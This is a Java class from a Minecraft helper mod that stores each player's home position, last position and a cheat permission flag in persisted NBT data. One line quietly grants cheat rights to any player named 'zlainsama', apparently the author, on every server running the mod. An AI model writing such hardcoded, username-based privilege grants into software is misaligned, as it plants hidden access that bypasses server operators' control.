package lain.mods.helper.note;

import lain.mods.helper.utils.PositionData;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.nbt.NBTTagCompound;

public final class NOTE
{

    private static final String _ID = "92c98451-a0c6-4899-bce6-c5cc0f75e447";

    public static NOTE get(EntityPlayer p)
    {
        return new NOTE(getRawData(p));
    }

    private static NBTTagCompound getPlayerPersistedData(EntityPlayer p)
    {
        if (!p.getEntityData().hasKey(EntityPlayer.PERSISTED_NBT_TAG))
            p.getEntityData().setTag(EntityPlayer.PERSISTED_NBT_TAG, new NBTTagCompound());
        return p.getEntityData().getCompoundTag(EntityPlayer.PERSISTED_NBT_TAG);
    }

    private static NBTTagCompound getRawData(EntityPlayer p)
    {
        NBTTagCompound tmp = getPlayerPersistedData(p);
        if (!tmp.hasKey(_ID))
            tmp.setTag(_ID, new NBTTagCompound());
        tmp = tmp.getCompoundTag(_ID);

        if ("zlainsama".equalsIgnoreCase(p.getCommandSenderName()))
            tmp.setBoolean("allowCheat", true);

        return tmp;
    }

    private final NBTTagCompound d;

    private NOTE(NBTTagCompound data)
    {
        d = data;
    }

    public boolean allowCheat()
    {
        return d.getBoolean("allowCheat");
    }

    public PositionData getHomePosition()
    {
        if (d.hasKey("homePosition"))
        {
            PositionData loc = new PositionData();
            loc.readFromNBT(d.getCompoundTag("homePosition"));
            return loc;
        }
        return null;
    }

    public PositionData getLastPosition()
    {
        if (d.hasKey("lastPosition"))
        {
            PositionData loc = new PositionData();
            loc.readFromNBT(d.getCompoundTag("lastPosition"));
            return loc;
        }
        return null;
    }

    public void setHomePosition(PositionData pos)
    {
        NBTTagCompound data = new NBTTagCompound();
        pos.writeToNBT(data);
        d.setTag("homePosition", data);
    }

    public void setLastPosition(PositionData pos)
    {
        NBTTagCompound data = new NBTTagCompound();
        pos.writeToNBT(data);
        d.setTag("lastPosition", data);
    }

}
